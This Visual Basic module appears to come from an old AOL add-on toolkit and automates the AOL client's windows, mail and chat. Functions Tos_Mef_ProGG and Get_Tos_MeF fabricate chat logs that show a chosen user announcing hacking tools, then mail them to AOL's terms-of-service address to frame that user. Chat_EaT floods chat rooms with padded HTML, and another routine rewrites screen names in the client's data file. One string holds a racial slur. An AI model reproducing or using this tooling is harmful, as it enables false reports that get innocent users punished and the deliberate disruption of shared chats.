 If InStr(LCase(cmb), LCase("®")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("°")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("†")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("‡")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("•Ü•")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("…")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("‰")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("¼")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("¾")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("½")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("²")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("³")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("ª")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("á")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("à")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Â")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("ã")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Ä")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Ã")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Å")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("æ")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Æ")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Ç")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Ð")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("é")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("ë")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Ë")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("ƒ")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Í")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Î")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("ï")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("ñ")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("ñ")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Ñ")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("ó")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Ó")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Ò")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("ô")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Ô")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("ö")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Õ")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("ø")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Ø")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("œ")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Š")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("ß")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("þ")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Þ")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("™")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Ú")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("Ù")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("ÿ")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("•")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("¶")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("¿")) Then check_illegalChaRz = 1: Exit Function
 check_illegalChaRz = 0
 End Function

Function find_OK()
'ouwop
OKw = FindWindow("#32770", "America Online")
If OKw <> 0& Then find_OK = 1

End Function

Function Get_Tos_SubjecT(subjict)
'ouwop'
If subjict = "1" Then: Get_Tos_SubjecT = "a tos violation"
If subjict = "2" Then: Get_Tos_SubjecT = "i think this is illegal"
If subjict = "3" Then: Get_Tos_SubjecT = "help!"
If subjict = "4" Then: Get_Tos_SubjecT = "i need your help"
If subjict = "5" Then: Get_Tos_SubjecT = "hmmmm"
If subjict = "6" Then: Get_Tos_SubjecT = "look"
End Function

Sub kiLL_PPLconnection()
'ouwop
bud3% = FindChildByTitle(AolMdi, "Welcome to People Connection")
Call AOL4_KillWin(bud3%)
End Sub


Sub MsG_lizT(list As ListBox)
'ouwop
i = list.listcount - 1
list.ListIndex = 0
For X = 0 To i
a$ = a$ + list.list(X) + Chr(13)
Next X
MsgBox a$, 64, "whoz chattin..."
list.Clear
End Sub

Sub OpenSignOnScreEn()
'ouwop
Call runaolmenu(3&, 0&)
End Sub

 Function Tos_Mef_ProGG(Who$)
'originaly by ryan
'but eidted alot by me for better uze [ouwop]
Dim num, subjict
Randomize
num = Int(20 * Rnd + 1)
subjict = Int(6 * Rnd + 1)
Who$ = Who$ & ":"
If num = 1 Then: phraizE$ = Who$ & Chr(9) & "º¯`v´¯¯) PhrostByte By: Progee (¯¯`v´¯º"
If num = 2 Then: phraizE$ = Who$ & Chr(9) & ".·´¯`·-  gøthíc nightmâres by másta  ­·´¯`·" & Chr(13) & Who$ & Chr(9) & "·._.--   aøl 4.o punt tools · loaded ---._.·"
If num = 3 Then: phraizE$ = Who$ & Chr(9) & "· úpr mácro stùdio · másta ·"
If num = 4 Then: phraizE$ = Who$ & Chr(9) & "-=·Sting Anti Punta 2.o Loaded·=-" & Chr(13) & Who$ & Chr(9) & "-=·MaDe By SaBrE·=-"
If num = 5 Then: phraizE$ = Who$ & Chr(9) & "(¯\_ GøDZîLLa³·º _/¯)" & Chr(13) & Who$ & Chr(9) & "(¯\_ ßy ÇoLd _/¯)"
If num = 6 Then: phraizE$ = Who$ & Chr(9) & "¢º°¤÷®ÍP§ 2øøø÷¤°º¢" & Chr(13) & Who$ & Chr(9) & "¢º°¤÷£øÃdÊD÷¤°º¢"
If num = 7 Then: phraizE$ = Who$ & Chr(9) & "-•(`(`·•Fate Zero v¹ Loaded•·´)´)•-"
If num = 8 Then: phraizE$ = Who$ & Chr(9) & "•·.·´).·÷•[ Outlaw Mass Mailer by Twiztid"
If num = 9 Then: phraizE$ = Who$ & Chr(9) & "(¯`·.····÷• ärméñïå¹ · kðkô" & Chr(13) & Who$ & Chr(9) & "(¯`·.····÷• îøâdèd"
If num = 10 Then: phraizE$ = Who$ & Chr(9) & "•·._.·´¯`·>AoL 4.0 TooLz By: X GeNuS X" & Chr(13) & Who$ & Chr(9) & "•·._.·´¯`·>Status: LoaDeD" & Chr(13) & Who$ & Chr(9) & "•·._.·´¯`·>Ya'll BeTTa NoT MeSS WiT ThiS NiG!"
If num = 11 Then: phraizE$ = Who$ & Chr(9) & "^····÷• James Bond Toolz Ver .007" & Chr(13) & Who$ & Chr(9) & "^····÷• By: Saßan"
If num = 12 Then: phraizE$ = Who$ & Chr(9) & "(¯`•Prophecy²·° Loaded"
If num = 13 Then: phraizE$ = Who$ & Chr(9) & "···÷••(¯`·._ CoRn Fader _.·´¯)••÷···" & Chr(13) & Who$ & Chr(9) & "···÷••(¯`·._Created by :::PooP:::_.·´¯)••÷···"
If num = 14 Then: phraizE$ = Who$ & Chr(9) & "Blue Ice Punter¹ For AOL 4.0" & Chr(13) & Who$ & Chr(9) & "By STaNK"
If num = 15 Then: phraizE$ = Who$ & Chr(9) & "¤-----==America Onfire Platinum" & Chr(13) & Who$ & Chr(9) & "¤-----==Created (²›y Fatal Error"
If num = 16 Then: phraizE$ = Who$ & Chr(9) & "¤¤†³¹¹º†¤¤ SANNMEN †oºLz ¤¤†³¹¹º†¤¤" & Chr(13) & Who$ & Chr(9) & "¤¤†³¹¹º†¤¤    By:Má§†é®MinÐ    ¤¤†³¹¹º†¤¤" & Chr(13) & Who$ & Chr(9) & "¤¤†³¹¹º†¤¤ LOADED ¤¤†³¹¹º†¤¤"
If num = 17 Then: phraizE$ = Who$ & Chr(9) & "··¤÷×(Rapier Bronze)×÷¤··" & Chr(13) & Who$ & Chr(9) & "··¤÷×(By Excalibur)×÷¤··" & Chr(13) & Who$ & Chr(9) & "··¤÷×(Works for 3.0 and 4.0!!!)×÷¤··"
If num = 18 Then: phraizE$ = Who$ & Chr(9) & "<-==(`(` Icy Hot 2.0 For AOL 4.0 ')')==->" & Chr(13) & Who$ & Chr(9) & "<-==(`(` Loaded ')')==->"
If num = 19 Then: phraizE$ = Who$ & Chr(9) & "(\›•‹ Im Backfire KiLLer ›•‹/)" & Chr(13) & Who$ & Chr(9) & "(\›•‹ By:phire Status:Loaded ›•‹/)" & Chr(13) & Who$ & Chr(9) & "(\›•‹ Im Backfire KiLLer ›•‹/)"
If num = 20 Then: phraizE$ = Who$ & Chr(9) & "[_.·´¯° Indian Invasion Punter Loaded °¯`·._]"""
If subjict = 1 Then: sUbjj$ = "a tos violation"
If subjict = 2 Then: sUbjj$ = "i think this is illegal"
If subjict = 3 Then: sUbjj$ = "help!"
If subjict = 4 Then: sUbjj$ = "i need your help"
If subjict = 5 Then: sUbjj$ = "hmmmm"
If subjict = 6 Then: sUbjj$ = "look"
Call MazTa_SendMail("tosgeneral", sUbjj$, phraizE$)
End Function

 Function Get_Tos_MeF(num, Who$)
'[Ouwop]
Who$ = Who$ & ":"
If num = "1" Then: Get_Tos_MeF = Who$ & Chr(9) & "º¯`v´¯¯) PhrostByte By: Progee (¯¯`v´¯º"
If num = "2" Then: Get_Tos_MeF = Who$ & Chr(9) & ".·´¯`·-  gøthíc nightmâres by másta  ­·´¯`·" & Chr(13) & Who$ & Chr(9) & "·._.--   aøl 4.o punt tools · loaded ---._.·"
If num = "3" Then: Get_Tos_MeF = Who$ & Chr(9) & "· úpr mácro stùdio · másta ·"
If num = "4" Then: Get_Tos_MeF = Who$ & Chr(9) & "-=·Sting Anti Punta 2.o Loaded·=-" & Chr(13) & Who$ & Chr(9) & "-=·MaDe By SaBrE·=-"
If num = "5" Then: Get_Tos_MeF = Who$ & Chr(9) & "(¯\_ GøDZîLLa³·º _/¯)" & Chr(13) & Who$ & Chr(9) & "(¯\_ ßy ÇoLd _/¯)"
If num = "6" Then: Get_Tos_MeF = Who$ & Chr(9) & "¢º°¤÷®ÍP§ 2øøø÷¤°º¢" & Chr(13) & Who$ & Chr(9) & "¢º°¤÷£øÃdÊD÷¤°º¢"
If num = "7" Then: Get_Tos_MeF = Who$ & Chr(9) & "-•(`(`·•Fate Zero v¹ Loaded•·´)´)•-"
If num = "8" Then: Get_Tos_MeF = Who$ & Chr(9) & "•·.·´).·÷•[ Outlaw Mass Mailer by Twiztid"
If num = "9" Then: Get_Tos_MeF = Who$ & Chr(9) & "(¯`·.····÷• ärméñïå¹ · kðkô" & Chr(13) & Who$ & Chr(9) & "(¯`·.····÷• îøâdèd"
If num = "10" Then: Get_Tos_MeF = Who$ & Chr(9) & "•·._.·´¯`·>AoL 4.0 TooLz By: X GeNuS X" & Chr(13) & Who$ & Chr(9) & "•·._.·´¯`·>Status: LoaDeD" & Chr(13) & Who$ & Chr(9) & "•·._.·´¯`·>Ya'll BeTTa NoT MeSS WiT ThiS NiG!"
If num = "11" Then: Get_Tos_MeF = Who$ & Chr(9) & "^····÷• James Bond Toolz Ver .007" & Chr(13) & Who$ & Chr(9) & "^····÷• By: Saßan"
If num = "12" Then: Get_Tos_MeF = Who$ & Chr(9) & "(¯`•Prophecy²·° Loaded"
If num = "13" Then: Get_Tos_MeF = Who$ & Chr(9) & "···÷••(¯`·._ CoRn Fader _.·´¯)••÷···" & Chr(13) & Who$ & Chr(9) & "···÷••(¯`·._Created by :::PooP:::_.·´¯)••÷···"
If num = "14" Then: Get_Tos_MeF = Who$ & Chr(9) & "Blue Ice Punter¹ For AOL 4.0" & Chr(13) & Who$ & Chr(9) & "By STaNK"
If num = "15" Then: Get_Tos_MeF = Who$ & Chr(9) & "¤-----==America Onfire Platinum" & Chr(13) & Who$ & Chr(9) & "¤-----==Created (²›y Fatal Error"
If num = "16" Then: Get_Tos_MeF = Who$ & Chr(9) & "¤¤†³¹¹º†¤¤ SANNMEN †oºLz ¤¤†³¹¹º†¤¤" & Chr(13) & Who$ & Chr(9) & "¤¤†³¹¹º†¤¤    By:Má§†é®MinÐ    ¤¤†³¹¹º†¤¤" & Chr(13) & Who$ & Chr(9) & "¤¤†³¹¹º†¤¤ LOADED ¤¤†³¹¹º†¤¤"
If num = "17" Then: Get_Tos_MeF = Who$ & Chr(9) & "··¤÷×(Rapier Bronze)×÷¤··" & Chr(13) & Who$ & Chr(9) & "··¤÷×(By Excalibur)×÷¤··" & Chr(13) & Who$ & Chr(9) & "··¤÷×(Works for 3.0 and 4.0!!!)×÷¤··"
If num = "18" Then: Get_Tos_MeF = Who$ & Chr(9) & "<-==(`(` Icy Hot 2.0 For AOL 4.0 ')')==->" & Chr(13) & Who$ & Chr(9) & "<-==(`(` Loaded ')')==->"
If num = "19" Then: Get_Tos_MeF = Who$ & Chr(9) & "(\›•‹ Im Backfire KiLLer ›•‹/)" & Chr(13) & Who$ & Chr(9) & "(\›•‹ By:phire Status:Loaded ›•‹/)" & Chr(13) & Who$ & Chr(9) & "(\›•‹ Im Backfire KiLLer ›•‹/)"
If num = "20" Then: Get_Tos_MeF = Who$ & Chr(9) & "[_.·´¯° Indian Invasion Punter Loaded °¯`·._]"""



End Function

Function AdV()
a$ = INI_GeT("Settingz", "adv", App.Path + "\uzer.ini")
If a$ = "yez" Then
AdV = 1
Else
AdV = 0
End If
End Function


Sub Chat_EaT()
sendchat "<font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
sendchat "<font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
sendchat "<font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
sendchat "<font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
TimeOut (2)
End Sub



Function FindMemDir()
'ouwop
mem& = FindChildByTitle(AolMdi, "Member Directory")
If mem& <> 0& Then
FindMemDir = 1
Else
FindMemDir = 0
End If
End Function

Sub Fix_Chat_olSkooProggz()
'ouwop
If FindRoom Then
TimeOut (0.05)
room& = findChatRoom
AORich& = FindChildByClass(room&, "RICHCNTL")
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
TimeOut (0.05)
sendchat ("•···×<b>ouwopz chat fix0r for ol skoo proggz")
d = """"
sendchat ("•···×<b>chat room fixed- get me < a href=" + d + "http://come.to/ouwop" + d + "></u>chea</a>")
TimeOut (0.05)
Call AOL4_KillWin(AORich&)
TimeOut (0.05)

MsgBox "do not run thiz again unlezz you re-enter a chat room or it can fuck your aol up", 64, "Important"
TimeOut (0.05)
Else
MsgBox "cant find chat room, pleaze enter one firzt then redo thiz", vbCritical, "err0r!"
End If
End Sub

Public Function TimeOnline() As String
'ouwop edited =P
    Dim AolModal As Long, AolIcon As Long, AolStatic As Long
    Call PopUpIcon(5, "O")
    
    Do: DoEvents
    TimeOut (0.01)
        AolModal& = FindWindow("_AOL_Modal", "America Online")
        AolIcon& = FindWindowEx(AolModal&, 0, "_AOL_Icon", vbNullString)
        AolStatic& = FindWindowEx(AolModal&, 0, "_AOL_Static", vbNullString)
    Loop Until AolModal& <> 0& And AolIcon& <> 0& And AolStatic& <> 0&
    TimeOnline$ = gettext(AolStatic&)
    
    
chatTrim$ = Left$(TimeOnline$, 50)
For z = 1 To 50
If Mid$(chatTrim$, z, 1) = "." Then sn$ = Left$(chatTrim$, z - 1)
Next z
Text = TimeOnline$
ChatTrimNum = Len(sn$)
chatTrim$ = Mid$(Text, ChatTrimNum + 1, Len(Text)) ' - Len(sn$))
pw$ = chatTrim$
pw$ = RePlacestRing(pw$, ".", "")
pw$ = RePlacestRing(pw$, "hour", "hr.")
pw$ = RePlacestRing(pw$, "minutes", "minz.")
pw$ = RePlacestRing(pw$, "hours", "hrz.")
pw$ = RePlacestRing(pw$, "online for", "")
pw$ = RePlacestRing(pw$, "You have ", RemoveSpace(getuser) + " online time =")
pw$ = RePlacestRing(pw$, "been", "")
TimeOnline$ = pw$
    
    
    
    Call PostMessage(AolIcon&, WM_KEYDOWN, VK_SPACE, 0&)
    Call PostMessage(AolIcon&, WM_KEYUP, VK_SPACE, 0&)
End Function

Public Sub CloseAllAOLChilds()
    a$ = "0"
    Dim MDIClient As Long
    MDIClient& = FindWindow("AOL Frame25", vbNullString)
    If MDIClient& = 0& Then Exit Sub
    MDIClient& = FindWindowEx(MDIClient&, 0&, "MDIClient", vbNullString)
    Dim AOLChild As Long
FindTheChild:
    AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)
    If AOLChild& = 0& Then Exit Sub
    Call PostMessage(AOLChild&, WM_CLOSE, 0&, 0&)
    DoEvents
    a$ = a$ + 1
    If a$ = "10" Then GoTo nnn
    GoTo FindTheChild
nnn:
End Sub



Function LastChatLine()
On Error Resume Next
ChatTeXt = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
chatTrim$ = Mid$(ChatTeXt, ChatTrimNum + 4, Len(ChatTeXt) - Len(SNFromLastChatLine))
LastChatLine = chatTrim$
End Function
Function LastChatLineWithSN()
ChatTeXt$ = getchattext
For FindChar = 1 To Len(ChatTeXt$)
thechar$ = Mid(ChatTeXt$, FindChar, 1)
thechars$ = thechars$ & thechar$
If thechar$ = Chr(13) Then
TheChatText$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If
Next FindChar
lastlen = Val(FindChar) - Len(thechars$)
lastline = Mid(ChatTeXt$, lastlen, Len(thechars$))
LastChatLineWithSN = lastline
End Function

Public Function SNFromLastChatLine() As String
ChatTeXt$ = LastChatLineWithSN
chatTrim$ = Left$(ChatTeXt$, 26)
For z = 1 To 26
    If Mid$(chatTrim$, z, 1) = ":" Then
        sns = Left$(chatTrim$, z - 1)
    End If
Next z
SNFromLastChatLine = sns
End Function


Function findChatRoom()
a$ = FindRoom
findChatRoom = a$
End Function

Function FindChildByTitle(Parent, child)
childfocus% = GetWindow(Parent, 5)

While childfocus%
hwndLength% = GetWindowTextLength(childfocus%)
buffer$ = String$(hwndLength%, 0)
WindowText% = GetWindowText(childfocus%, buffer$, (hwndLength% + 1))

If InStr(UCase(buffer$), UCase(child)) Then FindChildByTitle = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend

End Function
Sub waitforOK()
a$ = "0"
Do
a$ = a$ + 1
DoEvents
OKR = FindWindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If
DoEvents
If a$ = "25" Then GoTo rrr
Loop Until OKR <> 0
       okb = FindChildByTitle(OKR, "OK")
    okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
waitforOK
rrr:
End Sub
Sub WaitForModal()
'ouwop
a$ = "0"
Do
a$ = a$ + 1
DoEvents:
aomodal% = FindWindow("_AOL_Modal", vbNullString)
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If
DoEvents
If a$ = "35" Then GoTo rrr
Loop Until aomodal% <> 0
antiidle
rrr:
antiidle
End Sub
Sub waitforOK3()
Do
DoEvents
OKw = FindWindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If
DoEvents
Loop Until OKw <> 0
       okb = FindChildByTitle(OKw, "OK")
    okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
End Sub

Sub wait4OK_2(caption As String, buttun As String)
Do
DoEvents
OKw = FindWindow("#32770", caption$)
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If
DoEvents
Loop Until OKw <> 0
    okb = FindChildByTitle(OKw, buttun$)
    okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)


End Sub
Public Function senDmail(Person As String, subject As String, message As String)
'iziakiel original, modified by me [ouwop] to werk on aol5.0 and aol4.0
    Dim AOL As Long, MDI As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, OpenSend As Long, doit As Long
    Dim Rich As Long, EditTo As Long, EditCC As Long
    Dim EditSubject As Long, SendButton As Long
    Dim Combo As Long, fCombo As Long, ErrorWindow As Long
    Dim Button1 As Long, Button2 As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    Do
    DoEvents
    TimeOut (0.1)
    Loop Until FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
       
       
       DoEvents
    Do
        DoEvents
        OpenSend& = FindWindowEx(MDI&, 0&, "AOL Child", "Write Mail")
        EditTo& = FindWindowEx(OpenSend&, 0&, "_AOL_Edit", vbNullString)
        EditCC& = FindWindowEx(OpenSend&, EditTo&, "_AOL_Edit", vbNullString)
        EditSubject& = FindWindowEx(OpenSend&, EditCC&, "_AOL_Edit", vbNullString)
        Rich& = FindWindowEx(OpenSend&, 0&, "RICHCNTL", vbNullString)
        Combo& = FindWindowEx(OpenSend&, 0&, "_AOL_Combobox", vbNullString)
        fCombo& = FindWindowEx(OpenSend&, 0&, "_AOL_Fontcombo", vbNullString)
        Button1& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Button2& = FindWindowEx(OpenSend&, Button1&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        TimeOut (0.001)
       If AOL_VerzioN = 5 Then
       For doit& = 1 To 15
       SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
       Next doit&
       Else
       If AOL_VerzioN = 4 Then
       For doit& = 1 To 13
       SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
       Next doit&
            
       End If
       
    End If
    Loop Until OpenSend& <> 0& And EditTo& <> 0& And EditCC& <> 0& And EditSubject& <> 0& And Rich& <> 0& And SendButton& <> 0& And Combo& <> 0& And fCombo& <> 0& & SendButton& <> Button1& And SendButton& <> Button2&
    Call SendMessageByString(EditTo&, WM_SETTEXT, 0, Person$)
    DoEvents
    Call SendMessageByString(EditSubject&, WM_SETTEXT, 0, subject$)
    DoEvents
    Call SendMessageByString(Rich&, WM_SETTEXT, 0, message$)
    DoEvents:
    TimeOut 0.5
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
    TimeOut (0.5)
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
jki:
TimeOut (0.00001)
If FindAwin("Write Mail") = 1 Then GoTo jki Else GoTo hui
hui:
TimeOut (0.03)
WaitForModal

End Function


Sub Form_ComeLeft(winForm As Form)
'ouwop
AligN winForm

b$ = "0"
winForm.Visible = True
winForm.Left = "-3000"
d$ = (Screen.Width - winForm.Width) \ 2
TimeOut (1)
Do
DoEvents:
b$ = b$ + 5
winForm.Left = b$
If winForm.Left > d$ Then GoTo dun
Loop Until b$ = d$
dun:

End Sub


Sub FormExit_up(winForm As Form)
'mover
Do
winForm.top = Trim(Str(Int(winForm.top) - 300))
DoEvents
Loop Until winForm.top < -4500
If winForm.top < -4500 Then Unload winForm
End Sub

Public Sub Form_Move(theForm As Form)
'MOUSEDOWN
       ReleaseCapture
       Call SendMessage(theForm.hwnd, &HA1, 2, 0&)
End Sub
Public Sub AOL25_ReseTneW(strsn As String, strnewsn As String, straolpath As String)
    Dim lngsnlen As Long, lngnumhold As Long, strtext As String, lngthesn As Long
    Dim lngthesn2 As Long, strtoreplace As String, lnglenofile2 As Long
    Call AOL4_KillWin(AOL25_FindSignOnScreeN)
    Let lngsnlen& = Len(strsn$)
    Select Case lngsnlen&
        Case 3&
            Let strsn$ = strsn$ & "             "
        Case 4&
            Let strsn$ = strsn$ & "            "
        Case 5&
            Let strsn$ = strsn$ & "           "
        Case 6&
            Let strsn$ = strsn$ & "          "
        Case 7&
            Let strsn$ = strsn$ & "         "
        Case 8&
            Let strsn$ = strsn$ & "        "
        Case 9&
            Let strsn$ = strsn$ & "       "
        Case 10&
            Let strsn$ = strsn$ & "      "
        Case 11&
            Let strsn$ = strsn$ & "     "
        Case 12&
            Let strsn$ = strsn$ & "    "
        Case 13&
            Let strsn$ = strsn$ & "   "
        Case 14&
            Let strsn$ = strsn$ & "  "
        Case 15&
            Let strsn$ = strsn$ & " "
        Case 16&
            Let strsn$ = strsn$
    End Select
    Let lngsnlen& = Len(strnewsn$)
    Select Case lngsnlen&
        Case 3&
            Let strnewsn$ = strnewsn$ & "             "
        Case 4&
            Let strnewsn$ = strnewsn$ & "            "
        Case 5&
            Let strnewsn$ = strnewsn$ & "           "
        Case 6&
            Let strnewsn$ = strnewsn$ & "          "
        Case 7&
            Let strnewsn$ = strnewsn$ & "         "
        Case 8&
            Let strnewsn$ = strnewsn$ & "        "
        Case 9&
            Let strnewsn$ = strnewsn$ & "       "
        Case 10&
            Let strnewsn$ = strnewsn$ & "      "
        Case 11&
            Let strnewsn$ = strnewsn$ & "     "
        Case 12&
            Let strnewsn$ = strnewsn$ & "    "
        Case 13&
            Let strnewsn$ = strnewsn$ & "   "
        Case 14&
            Let strnewsn$ = strnewsn$ & "  "
        Case 15&
            Let strnewsn$ = strnewsn$ & " "
        Case 16&
            Let strnewsn$ = strnewsn$
    End Select
    Let lngnumhold& = 1&
    If Right$(straolpath$, 1&) = "\" Then straolpath$ = Right$(straolpath$, 1&)
    Do Until 2& > 3&: DoEvents
        Let strtext$ = ""
        On Error Resume Next
        Open straolpath$ & "\idb\main.idx" For Binary As #1&
            If Err Then
                Exit Sub
            Else
                Let strtext$ = String$(32000&, 0&)
                Get #1, lngnumhold&, strtext$
            End If
        Close #1&
        Open straolpath$ & "\idb\main.idx" For Binary As #2&
            Let lngthesn& = InStr(1&, strtext$, strsn$, 1&)
            If lngthesn& Then
                Mid(strtext$, lngthesn&) = strnewsn$
                Let strtoreplace$ = strnewsn$
                Put #2&, (lngnumhold& + lngthesn&) - 1&, strtoreplace$
getthatsn:
                DoEvents
                Let lngthesn2& = InStr(1&, strtext$, strsn$, 1&)
                If lngthesn2& Then
                    Mid(strtext$, lngthesn2&) = strnewsn$
                    Put #2&, (lngnumhold& + lngthesn2&) - 1&, strtoreplace$
                    GoTo getthatsn
                End If
            End If
            Let lngnumhold& = lngnumhold& + 32000&
            Let lnglenofile2& = LOF(2&)
        Close #2&
        If lngnumhold& > lnglenofile2& Then Call runaolmenubystring("&Sign On Screen"): Exit Sub
    Loop
End Sub

Sub IXI_List_Load(FilEneRm As String, extenZion As String, List1 As ListBox, cmdialog1 As Control, picture1 As PictureBox, text12 As TextBox, text1 As TextBox)
On Error Resume Next
cmdialog1.Filter = FilEneRm$ + " (*." + extenZion$ + ")|*." + extenZion$ + "|"
cmdialog1.FilterIndex = 1
cmdialog1.Action = 1
Open cmdialog1.FileName For Input As 1
Close 1
If cmdialog1.FileName = "" Then GoTo dick
If cmdialog1.FileName = "*.*" Then GoTo dick
If cmdialog1.FileName = "*." + extenZion Then GoTo dick
a = 1
List1.Clear
Call LoadtxtToText(cmdialog1.FileName, text12)
FF$ = CountTextBoxLines(text12)
fg$ = "0"
On Error Resume Next
Open (cmdialog1.FileName) For Input As #1
While (EOF(a) = False)
Line Input #a, b$
fg$ = fg$ + 1
Call PercentBar(picture1, fg$, FF$)
If b$ = "" Then GoTo nex
List1.AddItem LCase(RemoveSpace(b$))
TimeOut (0.00000000001)
nex:
Wend
TimeOut (0.00000000001)
dick:
Close #1
TimeOut (0.00000000001)
text1.Text = ""
Call Percent_reseT(picture1)
End Sub

